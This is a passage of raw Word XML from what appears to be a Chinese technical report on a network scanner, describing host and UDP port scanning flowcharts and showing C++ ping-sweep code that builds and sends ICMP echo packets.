          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F86F4A" w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>主机扫描流程图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A699CA7" w14:textId="3D2D5C99" w:rsidR="00726AF5" w:rsidRPr="00236FF6" w:rsidRDefault="004D5A21" w:rsidP="00236FF6">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1110" w:name="_Toc482522649"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r w:rsidR="00726AF5">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>ing函数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1110"/>
    </w:p>
    <w:p w14:paraId="68F9D6A2" w14:textId="50F363B8" w:rsidR="002C55A5" w:rsidRPr="00465F10" w:rsidRDefault="002C55A5" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
        <w:ind w:firstLine="420"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ing函数直接调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>PingCore</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数，Ping</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ore函数流程图如下，先构建SOCKET，再构建ICMP包，然后调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>sendto</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数发送数据包，再调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>WSAWaitForMultipleEvents</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数处理相应报文，</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>GetTickCountCalibrate</w:t>
      </w:r>
      <w:r w:rsidRPr="00465F10">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处理超时。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CD97E0" w14:textId="1AEB7DB2" w:rsidR="00C0192E" w:rsidRDefault="002C55A5" w:rsidP="00C0192E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="542530A1" wp14:editId="1EA53387">
            <wp:extent cx="4094709" cy="7383780"/>
            <wp:effectExtent l="0" t="0" r="12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96412" cy="7386851"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F5D291" w14:textId="09C72163" w:rsidR="002C55A5" w:rsidRPr="001F214B" w:rsidRDefault="00C0192E" w:rsidP="00C0192E">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">图5. </w:t>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5. \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="001F214B" w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r w:rsidR="001F214B" w:rsidRPr="001F214B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口扫描流程图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2014282C" w14:textId="77777777" w:rsidR="002C55A5" w:rsidRDefault="002C55A5" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
        <w:ind w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Sendto</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数和</w:t>
      </w:r>
      <w:r>
        <w:t>WSAWaitForMultipleEvents</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数都是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>winsock</w:t>
      </w:r>
      <w:r>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>库中的函数，分别用于发送和接受数据包。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C87B239" w14:textId="59A77F75" w:rsidR="002C55A5" w:rsidRDefault="002C55A5" w:rsidP="005A512D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:t>GetTickCountCalibrate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数根据系统时间，获取捕获开始到程序当前时间。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1885B361" w14:textId="06EE7CE3" w:rsidR="005A512D" w:rsidRPr="009E4AA0" w:rsidRDefault="005A512D" w:rsidP="005A512D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>函数：</w:t>
      </w:r>
      <w:r w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>hostScan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06804D2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DWORD WINAPI hostScan(LPVOID lpParameter) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031CB9F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CPing objPing;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0018238A"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sendICMPStruct *data = new sendICMPStruct();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39180594"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data = (sendICMPStruct*)lpParameter;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699AE23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for (int i = data-&gt;startScanIP; i &lt; data-&gt;endIP; i++)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E43C2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4FE39F0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PingReply reply;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A58655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sendIP[20] = "";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C34DBB3"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char tempStr[4] = "";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DD5018"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_itoa_s(i, tempStr, 4, 10);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F56A267"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sendIPsub);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A122A9"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strcat_s(sendIP, 20, tempStr);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BB6DAF"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objPing.Ping(sendIP, &amp;reply);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226BA692"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hostThreadScanTimes++;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E1FA45"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r>
      <w:r w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
        <w:t>strcpy_s(sendIP, "");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764AEAA0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3317F9DB" w14:textId="77777777" w:rsidR="009E4AA0" w:rsidRPr="009E4AA0" w:rsidRDefault="009E4AA0" w:rsidP="007D3B90">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="0" w:afterLines="0" w:after="0" w:line="240" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
        <w:t>return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5A2838" w14:textId="7AE05F4F" w:rsidR="00FA5EF4" w:rsidRPr="002C55A5" w:rsidRDefault="009E4AA0" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="0" w:afterLines="0" w:after="0" w:line="240" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5207D92E" w14:textId="2652E28E" w:rsidR="00FA5EF4" w:rsidRDefault="00FA5EF4" w:rsidP="00FA5EF4">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
      <w:r>
        <w:t>PingCore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E812B4E" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>PingCore(DWORD dwDestIP, PingReply *pPingReply, DWORD dwTimeout)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C671C49" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB50B43" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>判断初始化是否成功</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7DF504" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (!m_bIsInitSucc)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112D4EAE" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123033D8" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return FALSE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4195A5" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1516D347" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>配置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SOCKET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B419B2" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>sockaddr_in sockaddrDest;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434A7F68" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>sockaddrDest.sin_family = AF_INET;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C068609" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>sockaddrDest.sin_addr.s_addr = dwDestIP;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4150C529" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>int nSockaddrDestSize = sizeof(sockaddrDest);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A89115" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>构建</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ICMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D2AEA5" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>int nICMPDataSize = DEF_PACKET_SIZE + sizeof(ICMPHeader);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5882A584" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>ULONG ulSendTimestamp = GetTickCountCalibrate();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27148DEC" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT usSeq = ++s_usPacketSeq;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A956FD3" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memset(m_szICMPData, 0, nICMPDataSize);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EFCA5E" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>ICMPHeader *pICMPHeader = (ICMPHeader*)m_szICMPData;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57335462" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>pICMPHeader-&gt;m_byType = ECHO_REQUEST;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67392471" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pICMPHeader-&gt;m_byCode = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1637F206" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pICMPHeader-&gt;m_usID = m_usCurrentProcID;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4C8407" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pICMPHeader-&gt;m_usSeq = usSeq;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4171F50F" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pICMPHeader-&gt;m_ulTimeStamp = ulSendTimestamp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797F7EC3" w14:textId="2AD78B41" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pICMPHeader-&gt;m_usChecksum = CalCheckSum((USHORT*)m_szICMPData, nICMPDataS</w:t>
      </w:r>
      <w:r w:rsidR="00451829">
        <w:t>ize);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2F0197" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>发送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ICMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>报文</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455CD659" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (sendto(m_sockRaw, m_szICMPData, nICMPDataSize, 0, (struct sockaddr*)&amp;sockaddrDest, nSockaddrDestSize) == SOCKET_ERROR)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1597DBAB" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD2DF99" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return FALSE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD8DE6E" w14:textId="77777777" w:rsidR="007D3B90" w:rsidRDefault="007D3B90" w:rsidP="002C55A5">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
